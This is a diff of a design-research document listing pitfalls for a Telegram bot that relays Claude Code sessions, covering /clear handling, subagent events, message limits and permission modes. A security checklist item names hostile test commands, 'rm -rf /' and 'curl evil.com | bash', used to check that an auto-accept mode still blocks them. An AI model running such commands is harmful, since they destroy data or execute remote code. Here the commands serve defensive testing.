+The `SubagentStop` hook provides `agent_transcript_path` (e.g., `~/.claude/projects/.../abc123/subagents/agent-def456.jsonl`). The bot attempts to read this file for detailed subagent activity. But: (a) the file may not exist yet (race between hook firing and file being flushed), (b) the file path uses `~` which must be expanded, (c) the file may be in a different user's home directory if Claude Code runs under a different user than the bot, (d) the file may have been compacted or truncated by Claude Code's internal cleanup.
 
 **Why it happens:**
-This is an intentional breaking change in Agent SDK v0.1.0 (documented in migration guide). The `settingSources` option defaults to `[]` (empty array) instead of loading all sources. This provides isolation for SDK applications but is a trap for developers migrating from hook-based setups.
+The `SubagentStop` hook fires when the subagent finishes, but the JSONL transcript may still be in a write buffer. Reading immediately may get a partial file. The `agent_transcript_path` is a convenience field but the file lifecycle is not guaranteed to be synchronized with hook delivery.
 
-**Prevention:**
-- Explicitly set `settingSources: ['user', 'project', 'local']` if you want Claude Code CLI-equivalent behavior
-- Or better: programmatically configure everything via SDK options (cleaner, no filesystem dependency):
-  - `systemPrompt: { type: 'preset', preset: 'claude_code' }` for Claude Code system prompt
-  - `allowedTools: [...]` instead of settings.json allowed tools
-  - `hooks: {...}` instead of filesystem hook definitions
-- Do NOT mix filesystem hooks and SDK hooks -- the SDK hooks take precedence when `settingSources` includes 'project'
-- Test by comparing: start a session via CLI, start another via SDK, verify they behave identically for the same prompt
+**How to avoid:**
+- Do NOT rely on reading the subagent transcript file for the primary display. Use the `last_assistant_message` field from `SubagentStop` instead -- it is always present and contains the subagent's final summary.
+- If you need detailed subagent tool calls for an "expand" view, read the transcript with a small delay (500ms) and handle partial/missing files gracefully.
+- Expand the tilde in the path: `path.replace(/^~/, process.env.HOME || '')`.
+- Wrap all transcript reads in try/catch with a fallback to "(transcript unavailable)".
+- Parse JSONL line-by-line (already done in backfillFromTranscript), not as a single JSON blob, since partial writes produce incomplete final lines.
+
+**Warning signs:**
+- ENOENT errors when reading subagent transcripts
+- Partial JSON parse errors on the last line of transcript files
+- SubagentStop events arriving without usable transcript content
+- Tilde-prefixed paths failing on the filesystem
 
 **Phase to address:**
-Phase 1 (SDK configuration). Must decide the configuration strategy (programmatic vs filesystem) early.
+Phase 4 (subagent visibility). Design around `last_assistant_message` as the primary data source, transcript reading as optional enhancement.
 
 ---
 
-### Pitfall 11: Streaming Output Incompatible with Extended Thinking
+### Pitfall 11: /clear Session ID Instability
 
 **What goes wrong:**
-You enable `includePartialMessages: true` for real-time output, then also set `maxThinkingTokens` (or use a model that defaults to extended thinking). The SDK silently stops emitting `stream_event` messages. You only receive complete `AssistantMessage` objects after each turn -- effectively losing the streaming benefit. Your Telegram output goes from real-time to delayed, with no error or warning.
+When `/clear` fires, the `SessionEnd` (reason: "clear") carries the old session_id. The subsequent `SessionStart` (source: "clear") may carry a DIFFERENT session_id. The bot's session store maps session_id -> SessionInfo. If the session_id changes across `/clear`, the bot cannot find the existing SessionInfo for the new session, and either creates a duplicate session or loses track of the topic thread.
+
+This is the same class of problem as resume detection (Pitfall 1 from the v2.0 research, where `handleSessionStart` already handles `source === 'resume'` by matching on cwd). But `/clear` has an additional complication: the `SessionEnd` has not been fully processed yet when the `SessionStart` arrives.
 
 **Why it happens:**
-This is a documented limitation: "When you explicitly set `max_thinking_tokens`, `StreamEvent` messages are not emitted." The Claude API's extended thinking feature is incompatible with content streaming. The SDK degrades silently to non-streaming mode.
+Claude Code documentation states that `/clear` fires `SessionEnd` then `SessionStart`, but does not guarantee session_id stability. The existing resume detection logic in `handleSessionStart` (lines 206-219 of handlers.ts) matches by cwd, but this depends on the session still being in "active" state. If `handleSessionEnd` already set status to "closed" (see Pitfall 5), the cwd match fails.
 
-**Prevention:**
-- Do not set `maxThinkingTokens` if you need streaming events
-- Use the default `thinking: { type: 'adaptive' }` which does NOT trigger this incompatibility
-- If you need extended thinking for complex tasks, accept non-streaming output and use a polling-style update pattern for Telegram
-- Test: enable `includePartialMessages`, run a query, verify `stream_event` messages appear. Then enable thinking and verify the behavior change.
+**How to avoid:**
+- Handle `/clear` as a coordinated pair, not as two independent events.
+- In `handleSessionEnd` with `reason === "clear"`: set session status to `"clearing"` (a new state), NOT `"closed"`.
+- In `handleSessionStart` with `source === "clear"`: look for sessions in `"clearing"` state for the same cwd. If found, update the session_id mapping and set status back to `"active"`.
+- Add `getSessionByCwdAndStatus(cwd, "clearing")` to SessionStore for this lookup.
+- If the `SessionStart` (source: "clear") never arrives (e.g., user closes Claude Code during the clear), add a timeout that transitions `"clearing"` sessions to `"closed"` after 30 seconds.
+
+**Warning signs:**
+- Duplicate topics appearing after /clear
+- Session state stuck in "clearing" indefinitely
+- Old session ID in the store, new session ID in hook payloads, topic orphaned
 
 **Phase to address:**
-Phase 2 (output streaming). Document the constraint and ensure configuration does not accidentally enable both.
+Phase 3 (/clear topic reuse). Must be implemented alongside Pitfall 5 as a single coordinated change.
 
 ---
 
@@ -319,120 +317,202 @@ Issues that cause confusion or minor bugs but are quickly fixable.
 
 ---
 
-### Pitfall 12: SDKRateLimitEvent Type Missing from Exports (Issue #184)
+### Pitfall 12: Expanded Content Exceeds Telegram 4096-Char Message Limit
 
 **What goes wrong:**
-You try to handle `SDKRateLimitEvent` messages in TypeScript with proper type checking. The type resolves to `any` because it is referenced in the `SDKMessage` union but not exported from the package.
+User taps "Expand" on a tool call. The full tool input/output is 8,000 characters. The `editMessageText` call fails because the new message exceeds Telegram's 4096-character limit. The edit silently fails (or errors), and the user sees no change.
 
-**Prevention:**
-- Use string literal checks (`message.type === "rate_limit"`) instead of type guards until the export is fixed
-- Track issue #184 for the fix
-
----
-
-### Pitfall 13: session.close() Must Be Called Explicitly
-
-**What goes wrong:**
-You let a `query()` AsyncGenerator go out of scope without calling `.close()` or consuming all messages. The child process keeps running indefinitely because the generator's `return()` method is never called. This is a subtle memory/process leak.
-
-**Prevention:**
-- Always use `try/finally` around `for await` loops with `query.close()` in the `finally` block
-- Or use the V2 `await using session = ...` pattern (TypeScript 5.2+) for automatic cleanup (but see Pitfall 3 about V2 limitations)
-- Or consume the generator to completion (iterate until `ResultMessage`)
-
----
-
-### Pitfall 14: Zod Version Conflict
-
-**What goes wrong:**
-The SDK requires `zod ^3.24.1` for tool schema definitions. If your project uses Zod 4 (released in 2025), the SDK's internal Zod validation may conflict with your project's Zod imports. The `tool()` helper claims to support "Zod 3 and Zod 4" but edge cases in schema coercion differ between versions.
-
-**Prevention:**
-- Pin Zod 3.x in your project for now: `npm install zod@3`
-- If you need Zod 4 features, keep SDK tools on Zod 3 schemas and use Zod 4 elsewhere
-- Test tool schema validation after any Zod version change
-
----
-
-### Pitfall 15: Fastify HTTP Server Becomes Unnecessary (But Must Be Removed Carefully)
-
-**What goes wrong:**
-After migrating to the SDK, the Fastify HTTP hook server is no longer needed (the SDK handles hooks via callbacks, not HTTP POST). Developers leave the Fastify server running "just in case" or because removing it feels risky. The unused server consumes a port, adds dependencies, and confuses the architecture. Worse: if the old hook configuration in `~/.claude/settings.json` still points to the HTTP server, externally-launched Claude Code sessions (not managed by the SDK) will post to it, creating ghost events.
-
-**Prevention:**
-- Remove Fastify and its hook routes after the SDK migration is complete, not during
-- Remove the hook installation code (`installHooks()`) that writes HTTP hook config to settings.json
-- Clean up `~/.claude/settings.json` to remove any HTTP hook entries
-- Phase the removal: first add SDK, verify it works, THEN remove Fastify in a separate phase
+**How to avoid:**
+- Before editing, check if the expanded content exceeds 4096 characters.
+- If it does, truncate to 3800 characters (leaving room for formatting) and add "... (truncated, full output in file)".
+- Alternatively, send a follow-up document attachment with the full content and edit the message to say "Full output sent as file."
+- The existing `splitForTelegram` utility handles this for new messages but is not wired into the expand/collapse path.
 
 **Phase to address:**
-Final migration phase (cleanup). Only after SDK integration is fully verified.
+Phase 1 (compact tool output). Validation during expand handler implementation.
 
 ---
 
-## Phase-Specific Warnings
+### Pitfall 13: Permission Mode Buttons Overcrowding the Approval Message
 
-| Phase Topic | Likely Pitfall | Mitigation |
-|-------------|---------------|------------|
-| SDK session creation | 12s cold start (Pitfall 1) | Show "Starting..." in Telegram, use streaming input for subsequent messages |
-| Streaming input mode | Double token cost (Pitfall 2) | Use one-shot + resume pattern until #207 is fixed |
-| V1 vs V2 API choice | V2 ignores options (Pitfall 3) | Use V1 API only |
-| Tool approval flow | canUseTool blocks agent (Pitfall 4) | Short timeouts, auto-approve safe tools |
-| Process management | Orphaned processes (Pitfall 5) | Startup cleanup, systemd cgroup, PID tracking |
-| Event loop integration | grammY stalls during streaming (Pitfall 6) | Yield control, async message queue |
-| Telegram output | Rate limit overwhelm (Pitfall 7) | Reuse v1.0 batching, avoid partial messages |
-| Bot restart | Lost session IDs (Pitfall 8) | Persist session IDs immediately on capture |
-| Hook vs canUseTool | Wrong execution order (Pitfall 9) | canUseTool for approvals, hooks for logging |
-| Settings loading | Silent config ignore (Pitfall 10) | Explicit settingSources or programmatic config |
-| Thinking + streaming | Silent degradation (Pitfall 11) | Do not combine maxThinkingTokens with streaming |
-| Migration cleanup | Ghost hook events (Pitfall 15) | Remove Fastify and hook config only after full verification |
+**What goes wrong:**
+The approval message currently has 2 buttons (Approve, Deny). With permission modes, it might grow to 6 buttons (Approve, Deny, Accept All, Same Tool, Safe Only, Until Done). Telegram inline keyboards have a practical limit of how many buttons fit on a mobile screen. Six buttons in a row are unreadable. Multiple rows consume screen space and push the tool details off-screen.
+
+**How to avoid:**
+- Keep the primary approval message to 2-3 buttons: "Approve", "Deny", and "Mode..." (a submenu trigger).
+- Tapping "Mode..." edits the message to show the 4 mode options. Tapping any mode option sets the mode AND approves the current tool call.
+- This is a 2-step flow but keeps the primary UI clean.
+- Alternatively, permission modes are set via a separate `/mode` command, not on every approval message. The approval message stays simple (Approve/Deny only) and the current mode is shown in the status message.
+
+**Phase to address:**
+Phase 2 (permission modes). UX design before implementation.
+
+---
+
+### Pitfall 14: SubagentStart Events for Nested Subagents (Agents Spawning Agents)
+
+**What goes wrong:**
+Claude Code supports nested subagents (a Task agent can spawn its own subagents). Each nested subagent fires its own `SubagentStart` and `SubagentStop` events. The bot posts a notification for each one. With 7 parallel subagents, each potentially spawning 2-3 sub-subagents, the user sees 20+ rapid-fire "Agent started" / "Agent stopped" messages, drowning out useful information.
+
+**How to avoid:**
+- Track subagent nesting depth. Only display top-level subagent start/stop events in the topic.
+- For nested subagents, aggregate: show "3 sub-agents running" in the status message rather than individual start/stop messages.
+- Use the `agent_id` field to build a parent-child relationship tree if needed (note: the SubagentStart payload does not include a parent_agent_id -- nesting must be inferred from timing/context).
+- Apply the same verbosity filtering to subagent events as to tool calls. In "quiet" mode, suppress all subagent lifecycle messages.
+
+**Phase to address:**
+Phase 4 (subagent visibility). Consider during design how to handle agent fan-out.
+
+---
+
+### Pitfall 15: Status Message Context Percentage Not Resetting After /clear
+
+**What goes wrong:**
+Known Claude Code bug (GitHub issue #13765): the context_window data in the statusline does not reset after `/clear`. The bot reads context percentage from transcript usage data. After `/clear`, the transcript file may contain stale usage data from the pre-clear session, causing the status message to show "Context: 85%" when the actual usage is ~5%. The user thinks they are running out of context when they just cleared it.
+
+**How to avoid:**
+- On detecting `/clear` (SessionStart source: "clear"), force-reset contextPercent to 0 in the SessionStore.
+- Do not trust the first usage data received after `/clear` -- wait for the second data point which will reflect actual post-clear usage.
+- Update the status message immediately after /clear with explicit "Context: 0%" override.
+
+**Phase to address:**
+Phase 3 (/clear topic reuse). Reset context percentage as part of the /clear handling.
+
+---
+
+## Technical Debt Patterns
+
+Shortcuts that seem reasonable but create long-term problems.
+
+| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
+|----------|-------------------|----------------|-----------------|
+| Storing expand content in unbounded Map | Simple implementation, always available | Memory leak proportional to session length | Never -- use LRU cache from day one |
+| "Accept All" as a simple boolean bypass | Fast to implement, user gets what they asked for | Security vulnerability, no audit trail, no blocklist | Never -- tiered auto-accept is not much harder |
+| Hardcoding callback_data strings | No abstraction overhead | Hits 64-byte limit when adding features, inconsistent encoding | Only for the existing 2-button approval keyboard |
+| Treating /clear as SessionEnd + SessionStart independently | No code changes to existing handlers | Double-processes, closes then reopens topic, loses state | Never -- /clear must be handled as a coordinated pair |
+| Using agent_transcript_path for subagent display | Rich data about subagent activity | File I/O races, path issues, partial reads | Never as primary -- use last_assistant_message, transcript as optional |
+| Ignoring SubagentStart/Stop hooks | Subagents "just work" without the bot knowing | Users cannot see 60%+ of what Claude is doing (subagent work is invisible) | Only acceptable in MVP if subagent visibility is explicitly deferred |
+
+## Integration Gotchas
+
+Common mistakes when connecting to external services and APIs.
+
+| Integration | Common Mistake | Correct Approach |
+|-------------|----------------|------------------|
+| Telegram inline keyboards | Encoding full state in callback_data (exceeds 64 bytes) | Server-side lookup with short token in callback_data |
+| Telegram editMessageText | Concurrent edits to the same message from different code paths | Per-message edit lock or dedicate messages to a single editor |
+| Telegram pinChatMessage | No unpinChatMessage call before re-pinning | Unpin all topic messages before pinning new status message |
+| Claude Code /clear hook | Treating SessionEnd(clear) and SessionStart(clear) as independent events | Handle as coordinated pair with intermediate "clearing" state |
+| Claude Code SubagentStart/Stop | Assuming PostToolUse payload contains agent attribution | SubagentStart/Stop for lifecycle, PostToolUse cannot identify which agent made the call |
+| Claude Code session_id stability | Assuming same session_id after /clear or /compact | Match by cwd + state, not by session_id |
+| Telegram answerCallbackQuery | Not answering within 30 seconds (shows permanent spinner) | Always answerCallbackQuery immediately, even if the edit takes longer |
+
+## Performance Traps
+
+Patterns that work at small scale but fail as usage grows.
+
+| Trap | Symptoms | Prevention | When It Breaks |
+|------|----------|------------|----------------|
+| Unbounded expand content Map | Memory growth, eventual OOM | LRU cache with 200 entries, 30-min TTL | After ~500 tool calls per session |
+| Expand/collapse callback without debounce | 429 rate limit errors, all bot operations blocked | 2-second debounce per message_id | After 5 rapid taps on same button |
+| SubagentStart/Stop messages for every nested agent | Topic flooded with 20+ lifecycle messages | Show only top-level agents, aggregate nested ones | When Claude uses 7 parallel subagents with nested tasks |
+| Serializing callback_data lookup to JSON on every write | Disk I/O spike, blocking event loop | Batch writes or use in-memory-only with session-end cleanup | After 1000+ tool calls with expand buttons |
+| Per-edit Telegram API calls for status message after /clear | Rate limit hit during rapid post-clear activity | Debounce status updates to 1 per 10 seconds (already done via StatusMessage) | Within first 5 seconds after /clear |
+
+## Security Mistakes
+
+Domain-specific security issues beyond general web security.
+
+| Mistake | Risk | Prevention |
+|---------|------|------------|
+| "Accept All" mode with no blocklist | Remote code execution via prompt injection -- Claude deletes files, installs malware, exfiltrates data | Always maintain a blocklist of dangerous patterns that require manual approval regardless of mode |
+| Permission mode set by any group member | Unauthorized user enables auto-accept in shared group | Verify ctx.from.id against bot owner ID before changing permission mode |
+| callback_data containing session secrets | Other group members can see callback_data in API logs | Use opaque tokens that map to server-side state |
+| Auto-approve persisting after session context changes | User sets "Until Done" for safe task, Claude escalates to risky task in same turn | Reset auto-accept on tool escalation (safe->danger transition within a turn) |
+| No audit log for auto-approved operations | Cannot investigate what happened if something goes wrong | Log all auto-approved tool calls to a separate structured log |
+
+## UX Pitfalls
+
+Common user experience mistakes in this domain.
+
+| Pitfall | User Impact | Better Approach |
+|---------|-------------|-----------------|
+| Expand button on every tool call (including Read, Glob, Grep) | Cluttered UI, most expand buttons are never tapped | Only add expand buttons for Write, Edit, Bash with output > 200 chars |
+| Permission mode buttons replacing approve/deny on every message | Cognitive overload, users must parse 6 buttons each time | Separate permission modes to /mode command; approval stays 2 buttons |
+| Subagent start/stop messages as separate notifications | Topic flooded, useful messages pushed out of view | Inline subagent status in the pinned status message |
+| /clear visual separator being a plain text message | Easily missed, blends with regular output | Use a distinctive visual separator: bold line, emoji divider, different formatting |
+| Collapse button text identical to Expand button text | User confused about current state | Use stateful labels: "Show details" / "Hide details" or "[+] Expand" / "[-] Collapse" |
+| Expanded content showing raw JSON for tool input | Technical, hard to read for non-developers | Format expanded content as human-readable: file path, command, diff preview |
 
 ## "Looks Done But Isn't" Checklist
 
-- [ ] **Session cold start:** Sessions create successfully, but did you measure the 12-second startup? Users will report the bot as "slow to start."
-- [ ] **canUseTool fires:** Approval buttons appear, but does `canUseTool` actually fire for EVERY tool that needs approval? Check that no PreToolUse hook is short-circuiting it.
-- [ ] **Session resume works:** Bot restarts and resumes sessions, but are the session IDs persisted to disk? Kill the bot process and verify it resumes.
-- [ ] **Orphan cleanup:** Sessions start and stop cleanly, but crash the bot mid-session. Are child processes cleaned up on restart?
-- [ ] **Double-turn filtered:** Streaming mode works, but are you seeing duplicate AI responses? Check token costs against expected single-turn costs.
-- [ ] **Event loop yields:** One session streams output correctly, but start two sessions simultaneously. Does the approval button in session A still respond instantly while session B streams?
-- [ ] **Telegram batching:** Tool calls post to Telegram, but trigger 30 rapid tool calls in one session. Does the bot hit 429 rate limits?
-- [ ] **Settings loaded:** Claude behaves correctly in SDK sessions, but compare with CLI sessions. Are project CLAUDE.md instructions applied in both?
-- [ ] **Graceful shutdown:** Bot stops cleanly with SIGTERM, but all child SDK processes also terminate? Check `ps aux | grep claude` after shutdown.
-- [ ] **Memory stable:** Bot runs for 4+ hours with active sessions. Is RSS stable or growing?
+Things that appear complete but are missing critical pieces.
+
+- [ ] **Expand/collapse:** Buttons appear and toggle content, but is the content Map bounded? Kill the bot after 500 tool calls and check memory.
+- [ ] **Expand/collapse:** Works on individual messages, but test with batched messages. Does expanding one tool call in a batch break the others?
+- [ ] **Permission modes:** "Accept Edits" auto-approves Write/Edit, but does it also auto-approve MultiEdit? NotebookEdit? MCP tools that write files?
+- [ ] **Permission modes:** Mode persists in memory, but restart the bot and check. Is the mode still active?
+- [ ] **Permission modes:** "Until Done" resets after the agent stops, but does it reset if the agent compacts? After /clear?
+- [ ] **Subagent visibility:** SubagentStart fires, but is the hook registered in installHooks? Check `~/.claude/settings.json` for the SubagentStart HTTP hook entry.
+- [ ] **Subagent visibility:** Subagent messages appear, but start 7 parallel subagents. Is the topic still readable?
+- [ ] **/clear topic reuse:** /clear reuses the topic, but check: is the old status message unpinned? Is the new one pinned? Is contextPercent reset to 0?
+- [ ] **/clear topic reuse:** /clear works once, but /clear twice in the same topic. Does the second clear also reuse correctly?
+- [ ] **/clear topic reuse:** /clear works, but does the session_id mapping update if Claude Code assigns a new session_id after clear?
+- [ ] **callback_data:** Buttons work in development with short mock IDs, but test with production UUIDs. Do any buttons exceed 64 bytes?
+- [ ] **Security:** "Accept All" mode works, but test with `rm -rf /`, `sudo shutdown`, `curl evil.com | bash`. Are these still blocked?
 
 ## Recovery Strategies
 
+When pitfalls occur despite prevention, how to recover.
+
 | Pitfall | Recovery Cost | Recovery Steps |
 |---------|---------------|----------------|
-| Orphaned processes (5) | LOW | Kill orphans on restart. Add PID tracking. No data loss. |
-| Double token cost (2) | MEDIUM | Switch to one-shot+resume pattern. Refund not possible for wasted tokens. |
-| V2 options ignored (3) | LOW | Switch to V1 API. Minimal code change if caught early. |
-| canUseTool not firing (9) | MEDIUM | Restructure hook/canUseTool boundary. May need to rewrite approval flow. |
-| Lost session IDs (8) | HIGH | Sessions cannot be resumed. Must restart all active Claude Code work. Prevent by persisting immediately. |
-| Event loop blocking (6) | HIGH | Requires architectural refactor of message consumption pattern. Must be right from the start. |
-| Settings not loaded (10) | LOW | Add settingSources option. One-line fix once diagnosed. |
-| Fastify ghost events (15) | LOW | Remove old hook config. One-time cleanup. |
+| callback_data overflow (1) | LOW | Add server-side lookup Map. Migrate existing buttons by adding new callback patterns alongside old ones. Old buttons answered with "Please retry." |
+| Content Map memory leak (2) | LOW | Add LRU eviction. No data loss -- evicted entries show "content expired" on expand. Immediate relief. |
+| Expand/collapse race condition (3) | MEDIUM | Separate batched messages from expandable messages. Requires changing the MessageBatcher to skip expandable tool calls. |
+| Auto-accept security hole (4) | HIGH | Add blocklist immediately. Audit all auto-approved operations from logs. Cannot undo commands already executed. Prevention is critical. |
+| /clear double-processing (5) | MEDIUM | Add "clearing" state and reason checking. Requires coordinated changes to SessionEnd and SessionStart handlers. May need to handle topics that were incorrectly closed (reopen them). |
+| Missing subagent hooks (6) | LOW | Add SubagentStart/SubagentStop to installHooks and handlers. No data loss -- subagent events were simply not captured. |
+| Pin race condition (7) | LOW | Add unpinAllForumTopicMessages call before pinning. One-line fix. |
+| Permission mode lost on restart (8) | LOW | Add persistence field to SessionInfo. The field already serializes to JSON. One-field addition. |
+| Rate limit from expand spam (9) | LOW | Add debounce with timestamp tracking. Immediate fix, no architectural changes. |
+
+## Pitfall-to-Phase Mapping
+
+How roadmap phases should address these pitfalls.
+
+| Pitfall | Prevention Phase | Verification |
+|---------|------------------|--------------|
+| callback_data 64-byte limit (1) | Phase 1: Compact Tool Output | Measure byte length of every callback_data string in tests. Assert <= 64. |
+| Content Map memory leak (2) | Phase 1: Compact Tool Output | Run 500 tool calls in a test session. Check heapUsed before and after. |
+| Edit race conditions (3) | Phase 1: Compact Tool Output | Send expand callback during a batch flush. Verify no corruption. |
+| Auto-accept security (4) | Phase 2: Permission Modes | Test matrix: every permission mode x dangerous command patterns. |
+| /clear double-processing (5) | Phase 3: /clear Topic Reuse | Fire /clear 3 times in sequence. Same topic, no duplicates, correct state. |
+| Missing subagent hooks (6) | Phase 4: Subagent Visibility | Check ~/.claude/settings.json for SubagentStart/SubagentStop HTTP hooks. |
+| Pin race conditions (7) | Phase 3: /clear Topic Reuse | /clear then check: exactly 1 pinned message, correct content. |
+| Permission mode persistence (8) | Phase 2: Permission Modes | Set mode, restart bot, verify mode restored in status message. |
+| Expand/collapse rate limit (9) | Phase 1: Compact Tool Output | Tap expand 10 times in 5 seconds. No 429 errors in logs. |
+| Subagent transcript access (10) | Phase 4: Subagent Visibility | SubagentStop with missing/partial transcript. No crashes, graceful fallback. |
+| /clear session ID instability (11) | Phase 3: /clear Topic Reuse | /clear in a long session. Verify session_id remapping works. |
+| Expanded content exceeds 4096 (12) | Phase 1: Compact Tool Output | Expand a tool call with 10KB output. Content truncated, file attachment sent. |
+| Approval button overcrowding (13) | Phase 2: Permission Modes | Screenshot approval message on mobile. All buttons readable and tappable. |
+| Nested subagent flood (14) | Phase 4: Subagent Visibility | Run a task with 7 parallel agents. Topic remains readable, not flooded. |
+| Context % not resetting after /clear (15) | Phase 3: /clear Topic Reuse | /clear at 85% context. Status message shows ~0% within 5 seconds. |
 
 ## Sources
 
-- [Claude Agent SDK TypeScript Reference](https://platform.claude.com/docs/en/agent-sdk/typescript) -- HIGH confidence. Official V1 API documentation.
-- [Claude Agent SDK Overview](https://platform.claude.com/docs/en/agent-sdk/overview) -- HIGH confidence. Architecture and capabilities.
-- [Streaming Input Documentation](https://platform.claude.com/docs/en/agent-sdk/streaming-vs-single-mode) -- HIGH confidence. Streaming vs single mode, AsyncIterable usage.
-- [Streaming Output Documentation](https://platform.claude.com/docs/en/agent-sdk/streaming-output) -- HIGH confidence. includePartialMessages, event types, thinking incompatibility.
-- [Handle Approvals and User Input](https://platform.claude.com/docs/en/agent-sdk/user-input) -- HIGH confidence. canUseTool callback, PermissionResult types, AskUserQuestion.
-- [Session Management](https://platform.claude.com/docs/en/agent-sdk/sessions) -- HIGH confidence. Session IDs, resume, fork, persistence.
-- [Hosting the Agent SDK](https://platform.claude.com/docs/en/agent-sdk/hosting) -- HIGH confidence. Resource requirements, deployment patterns, process management.
-- [Migration Guide](https://platform.claude.com/docs/en/agent-sdk/migration-guide) -- HIGH confidence. Breaking changes from claude-code-sdk to claude-agent-sdk.
-- [V2 Preview Documentation](https://platform.claude.com/docs/en/agent-sdk/typescript-v2-preview) -- HIGH confidence. Unstable API warnings, feature gaps.
-- [GitHub Issue #207: AsyncIterable double turn](https://github.com/anthropics/claude-agent-sdk-typescript/issues/207) -- HIGH confidence. Detailed analysis, reproducible, workarounds documented.
-- [GitHub Issue #176: V2 ignores options](https://github.com/anthropics/claude-agent-sdk-typescript/issues/176) -- HIGH confidence. Root cause identified, workaround provided.
-- [GitHub Issue #142: Orphaned processes](https://github.com/anthropics/claude-agent-sdk-typescript/issues/142) -- HIGH confidence. Production impact documented, multiple workarounds.
-- [GitHub Issue #34: 12-second overhead](https://github.com/anthropics/claude-agent-sdk-typescript/issues/34) -- HIGH confidence. Benchmarks provided, Anthropic acknowledged.
-- [GitHub Issue #173: SIGTERM during cleanup](https://github.com/anthropics/claude-agent-sdk-typescript/issues/173) -- MEDIUM confidence. Python-specific but SIGTERM handling applies to TypeScript too.
-- [SDK Changelog](https://github.com/anthropics/claude-agent-sdk-typescript/blob/main/CHANGELOG.md) -- HIGH confidence. Version history, bug fixes, breaking changes. Latest: v0.2.63.
-- [Claudegram (Grammy + SDK integration)](https://github.com/NachoSEO/claudegram) -- MEDIUM confidence. Real-world integration patterns, request queuing, session isolation.
-- [GitHub Issue #333 (Python): Multi-instance performance](https://github.com/anthropics/claude-agent-sdk-python/issues/333) -- MEDIUM confidence. Python-specific but documents the 20-30s startup issue.
+- [Telegram Bot API - InlineKeyboardButton callback_data](https://core.telegram.org/bots/api#inlinekeyboardbutton) -- HIGH confidence. Official API docs confirming 1-64 byte limit.
+- [Claude Code Hooks Reference](https://code.claude.com/docs/en/hooks) -- HIGH confidence. SessionStart source field, SubagentStart/SubagentStop payloads, SessionEnd reason field.
+- [GitHub Issue #13765: Context tracking not resetting on /clear](https://github.com/anthropics/claude-code/issues/13765) -- HIGH confidence. Known bug affecting status display after /clear.
+- [GitHub Issue #10373: SessionStart hooks not working for new conversations](https://github.com/anthropics/claude-code/issues/10373) -- MEDIUM confidence. Documents timing issues with SessionStart hooks.
+- [grammY Scaling Guide: Flood Limits](https://grammy.dev/advanced/flood) -- HIGH confidence. Official grammY documentation on Telegram rate limits.
+- [grammY Interactive Menus Plugin](https://grammy.dev/plugins/menu) -- HIGH confidence. Memory leak warning about dynamic menu registration.
+- [Enhanced Telegram callback_data with protobuf + base85](https://seroperson.me/2025/02/05/enhanced-telegram-callback-data/) -- MEDIUM confidence. Community pattern for working around the 64-byte limit.
+- [Telegram bot inline buttons with large data](https://medium.com/@knock.nevis/telegram-bot-inline-buttons-with-large-data-950e818c1272) -- MEDIUM confidence. Server-side lookup pattern for callback_data.
+- [Claude Code Subagents Documentation](https://code.claude.com/docs/en/sub-agents) -- HIGH confidence. Subagent types, transcript storage, lifecycle.
+- [GitHub Issue #20531: TaskOutput returns full JSONL transcript](https://github.com/anthropics/claude-code/issues/20531) -- MEDIUM confidence. Documents transcript format and parsing challenges.
+- [Existing codebase analysis](/home/cryptobot/workspace/claude-o-gram/src/) -- HIGH confidence. Direct inspection of current bot.ts, formatter.ts, handlers.ts, topics.ts, session-store.ts, approval-manager.ts.
 
 ---
-*Pitfalls research for: Claude Agent SDK Migration (v2.0)*
+*Pitfalls research for: v3.0 UX Overhaul (compact output, permission modes, subagent visibility, /clear reuse)*
 *Researched: 2026-03-01*
